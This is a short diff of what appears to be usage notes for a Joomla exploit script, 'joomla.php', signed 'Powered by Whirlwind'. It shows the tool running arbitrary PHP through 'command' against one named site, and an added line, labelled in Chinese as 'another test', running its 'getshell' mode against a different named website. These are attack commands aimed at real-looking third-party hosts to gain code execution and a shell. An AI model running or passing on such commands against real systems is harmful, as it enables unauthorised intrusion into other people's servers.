@@ -16,3 +16,6 @@ php joomla.php http://xatusec.org command 'phpinfo();'
 `
 
 -------------------Powered by Whirlwind-------------------
+
+再送一个测试 php joomla.php http://enoki.jp/ getshell 
+
